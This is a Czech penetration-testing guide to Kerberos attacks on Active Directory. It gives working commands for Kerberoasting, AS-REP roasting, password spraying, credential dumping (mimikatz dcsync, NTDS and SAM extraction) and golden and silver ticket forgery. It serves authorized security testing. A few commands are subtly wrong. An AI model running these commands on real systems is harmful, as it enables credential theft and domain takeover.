# Keberos - penetrační testy

## Kerberoasting

### Popis testu

Cílem testu je ověřit, zda je možné získat a prolomit NTML hash tiketů TGS. Tiket je zašifrován tajným klíčem uživatele odvozeného z jeho hesla. Získáním tiketů lze hesla lámat offline slovníkovým útokem nebo útokem hrubou silou.

### Jak provést test manuálně

**Enumerace (Windows)**

Naklonovat repozitář s **powerview.ps1** :
```
git clone https://github.com/PowerShellEmpire/PowerTools.git
```
Možnost přímeho stažení z:
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1

Import PowerView:
```
powershell.exe -nop -exec bypass

Import-Module <cesta k powerview.ps1>
```

Získat všechny uživatele s nastaveným SPN:
```
Get-DomainUser -SPN
```

**Exploitace (Windows)**

Zažádat o tiket:
```
Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat -Credential $cred
```

Lámání NTML hashe slovníkovým útokem pomocí [hashcat64](https://hashcat.net/hashcat/):
```
hashcat64.exe -a -m 13100 SPN.hash <cesta ke slovniku>
```

**Enumerace (Kali Linux)**

Enumerace:
```
git clone https://github.com/SecureAuthCorp/impacket.git

cd impacket/examples

python GetUserSPNs.py domena/uzivatel:heslo -outputfile <extrahovane hashe>
```

Lámání NTML hashe pomocí [john](https://hashcat.net/hashcat/):
```
john --wordlist=<cesta_ke_slovniku>
```

### Možné výsledky testu

Prolomení hashe uživatelského hesla a získání přihlašovacích údajů doménového účtu.

### Testem lze odhalit tyto zranitelnosti

- [Ticket encryption with password hash](vulnerabilities.md)

## Enumerace uživatelských účtů a útok hrubou silou

### Popis testu

Cílem testu je ověřit, zda je možné enumerovat uživatelské účty a získat tak přístupové údaje do domény Active Directory. Test lze provést bez uživatelského účtu, stačí se pouze spojit s KDC.


**Enumerace (Kali Linux)**

Nástrojem [nmap](https://nmap.org/) a skriptem [krb5-enum-users](https://nmap.org/nsedoc/scripts/krb5-enum-users.html):
```
nmap -verbose 4 -p 88 --script krb5-enum-users --script-args krb5-enum-users-realm='kerbrealm',userdb=<soubor s uzivateli> <ip adresa domenoveho radice>
```

**Enumerace a útok hrubou silou (Kali Linux)**

Nástrojem [kerbrute](https://github.com/TarlogicSecurity/kerbrute):
```
git clone https://github.com/TarlogicSecurity/kerbrute.git

cd kerbrute

pip install -r requirements.txt

python kerbrute.py -domain <adresa domeny> -users <soubor s uzivateli> -passwords <soubor s hesly> -outputfile <nalezene ucty>
```

### Možné výsledky testu

Nalezení uživatele a hesla doménového účtu.

### Testem lze odhalit tyto zranitelnosti

- [Enumerace uživatelských účtů](vulnerabilities.md)

## Unconstrained delegation (TGT Forwarding / Trusted Forwarding)

### Popis testu

Cílem je zjistit jestli nějaká zařízení nebo uživatelé (hlavně u admin a jiných privilegovaných účtů) mají povoleno unconstrained delegation. Zachycené tickety použít pro pass-the-ticket.

### Jak provést test manuálně

Zjistit pomocí funkce Get-ADComputer a ActiveDirectory modulu, které zařízení/uživatelé mají nastaveno Unconstrained delegation:
```
powershell.exe -nop -exec bypass

Import-Module ActiveDirectory

Get-ADComputer -Filter {(TrustedForDelegation - eq $true)}
```

Pomocí administrátorského účtu/účtu služby shromáždit TGT tickety:
```
Rubeus.exe dump
```

### Možné výsledky testu

Tikety lze použít pro útok Pass-the-Ticket.

### Testem lze odhalit tyto zranitelnosti

- [Unconstrained delegation (TGT Forwarding / Trusted Forwarding)](vulnerabilities.md)

## Constrained Delegation 

### Popis testu

Cílem testu je zjistit, jestli je možné, aby útočník získal pomocí S4U2Self přístup k určité službě jménem některého uživatele. Alternativně je možné zachycené TGS tikety použít pro Pass-The-Ticket útok.

### Jak provést test manuálně

**Enumerace (Windows)**

Enumerace serverů/zařízení s povoleným constrained delegation:
```
powershell.exe -nop -exec bypass

Import-Module ActiveDirectory

Get-ADComputer -Filter {(msDS-AllowedToDelegateTo -ne "{}")} -Properties TrustedForDelegation,TrustedToAuthForDelegation,ServicePrincipalName,Description,msDS-AllowedToDelegateTo
```

**Exploitace (Windows)**

Získat TGS tiket nástrojem [Rubeus](https://github.com/GhostPack/Rubeus):
```
Rubeus.exe asktgt /user:<uzivatel> /domain:<domena> /rc4:<NTML hash hesla>
```
### Testem lze odhalit tyto zranitelnosti

- [Constrained Delegation)](vulnerabilities.md)

## ASREPRoast

### Popis testu

Pokud je deaktivováno Pre-Authentication tak, že je nastavena politika Accounts Does not Require Pre-Authentication, přesněji DONT_REQ_PREAUTH, jejímž zneužitím lze žádat o TGT tikety. To je možné díky možnosti na KDC odesílat požadavky AS_REQ a získat zpětně odpovědi AS_REP. Data jsou zašifrována tajným klíčem uživatelů odvozeného z jejich hesel. Cílem testu je ověřit nastavení DONT_REQ_PREAUTH, pokusit se TGT získat a následně lámat uživatelská hesla offline. 

### Jak provést test manuálně

**Enumerace (Windows)**

Naklonovat repozitář s **powerview.ps1** :
```
git clone https://github.com/PowerShellEmpire/PowerTools.git
```
Možnost přímeho stažení z:
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1

Import PowerView:
```
powershell.exe -nop -exec bypass

Import-Module <cesta k powerview.ps1>
```

Získat všechny uživatele s nastaveným DONT_REQ_PREAUTH:
```
Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
```

**Exploitace (Windows)**

Stáhnout a importovat modul [SREPRoast](https://github.com/HarmJ0y/ASREPRoast):
```
git clone https://github.com/HarmJ0y/ASREPRoast.git

cd ASREPRoast

powershell.exe -nop -exec bypass

Import-Module .\ASREPRoast.ps1
```

Extrahování hashů uživatelských účtů:
```
Get-ASRepHash -Domain <adresa domeny> -UserName <uzivatelske jmeno>
```

Lámání NTML hashe slovníkovým útokem pomocí [hashcat64](https://hashcat.net/hashcat/):
```
hashcat64.exe -a 0 -m 7500 asrep.hash <cesta ke slovniku>
```

## Pass-The-Ticket

### Popis testu

Útok Pass-the-Ticket je založen na odcizení validního TGT tiketu uživatele a jeho přeposlání útočníkem. Útočník tak nemusí znát uživatelské heslo ani jeho hash a pomocí specializovaných nástrojů, jako je např. Mimikatz nebo Rubeus, lze získat tiket z paměti LSASS kompromitovaného systému. Proces žádosti o TGT tiket se přeskočí, jelikož útočník tiket již má k dispozici a zažádá tak přímo TGS o tiket služby ST. Jelikož je tiket validní, tak KDC není schopen probíhající útok zastavit. Se získaným tiketem služby může útočník dále bez problému k dané službě přistupovat. Tikety lze získat z LSASS (Local Security Authority Subsystem Service). Útok lze provést nástrojem Rubeus.

### Jak provést test manuálně

Extrahovat všechny aktivní tikety nástrojem [Rubeus](https://github.com/GhostPack/Rubeus):
```
Rubeus.exe triage
Rubeus.exe dump
```

Aktivace tiketu:
```
Rubeus.exe <tiket>.kirbi
```

Vzdálený přístup pomocí [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```
PsExec.exe -accepteula \\<domena> cmd
```

### Možné výsledky testu

Přístup ke službě s validním ST (Service Ticket).

## Golden Ticket

### Popis testu

Golden Ticket představuje validní TGT tiket, pomocí kterého může útočník přistupovat kamkoliv v doméně Active Directory (AD). Pro jeho vytvoření je nutné znát SID uživatele a hash účtu KRBTGT, který se v AD spolu s hashy ostatních uživatelů domény nachází v databázovém souboru NTDS.dit. KRBTGT je servisní účet řídícího serveru KDC a získání jeho hashe je tak nezbytné pro generování validních TGT tiketů.

### Jak provést test manuálně

Získat SID uživatelského účtu:
```
whoami /user
```

Získat NTLM hash účtu uživatele nebo služby, který se v AD nachází v databázovém souboru NTDS.dit, kde jsou uloženy hashe všech hesel, nám umožňuje autentizaci z dalších zařízení. 

Extrahování hashe hesla nástrojem [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec):
```
python3 -m pip install pipx

pipx ensurepath

pipx install crackmapexec

crackmapexec smb <adresa domenoveho radice> -u <uzivatel> -H <hashe uzivatelskeho uctu> --ntds
```

Extrahování hashe hesla nástrojem [Mimikatz](https://github.com/ParrotSec/mimikatz):
```
lsadump::dcsync /domain:<adresa domeny> /user:<uzivatelske jmeno>
```

Vygenerovat TGT tiket nástrojem Mimikatz:
```
kerberos::golden /domain: <adresa domeny> /sid:<SID> /user:<uzivatelske jmeno> /id:<RID> /krbtgt:<NTLM hash KRBTGT> /ptt
```

Vzdálený přístup pomocí [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```
PsExec.exe -accepteula \\<domena> cmd
```

### Možné výsledky testu

Tím, že si útočník validní tiket vygeneroval, tak se již nemusí autentizovat vůči KDC a může si přímo zažádat u TGS o tiket služby ST. Jelikož je tiket validní, TGS nemá důvod útočníkovu žádost zamítnout. Útočník je omezen pouze živnostností tiketů, která je ve výchozím stanovena na 10 hodin po jeho vytvoření. Narozdíl od útoku Pass-The-Ticket to útočníka nijak nelimituje, jelikož si okamžitě po vypršení platnosti tiketu může vytvořit nový TGT.

## Silver Ticket

### Popis testu

Útok Silver Ticket cílí na TGS a s tiketem tak lze přistupovat pouze ke konkrétní službě. Údaje potřebné pro vygenerování Silver Ticket jsou název domény a SID, které lze v systému Windows získat příkazem whoami. Dále je nutné znát NTLM hash účtu uživatele nebo služby. Hash uživatelského účtu lze extrahovat ze souboru SAM nebo v rámci Active Directory z databázového souboru NTDS.dit. Se všemi těmito údaji může útočník neomezeně generovat tikety služby ST a jelikož jsou všechny údaje validní, tak samotná služba útok rozpoznat nedokáže.

### Jak provést test manuálně

Získat SID uživatelského účtu:
```
whoami /user
```

Získat NTLM hash účtu uživatele nebo služby, který se v AD nachází v databázovém souboru NTDS.dit, kde jsou uloženy hashe všech hesel, nám umožňuje autentizaci z dalších zařízení. 

Extrahování hashe hesla nástrojem [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec):
```
python3 -m pip install pipx

pipx ensurepath

pipx install crackmapexec

crackmapexec smb <adresa domenoveho radice> -u <uzivatel> -H <hashe uzivatelskeho uctu> --ntds
```

Získat NTLM hash z binárního databázového souboru SAM, který v operačních systémech Windows ukládá uživatelská jména a hesla v hashované podobě. 

Extrahování registrů (Windows):
```
REG SAVE hklm\system system
REG SAVE hklm\sam sam
```

Extrahování hashů (Kali Linux):
```
samdump2 system sam
```

Vygenerovat tiket pomocí nástrojem [Mimikatz](https://github.com/ParrotSec/mimikatz):
```
kerberos::golden /domain: <adresa domeny> /sid:<SID> /user:<uzivatelske jmeno> /id:<RID> /rc4:<NTLM hash hesla> /ptt
```

Vzdálený přístup pomocí [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):
```
PsExec.exe -accepteula \\<domena> cmd
```

### Možné výsledky testu
Vygenerování validního tiketu služby ST a přístup k dané službě.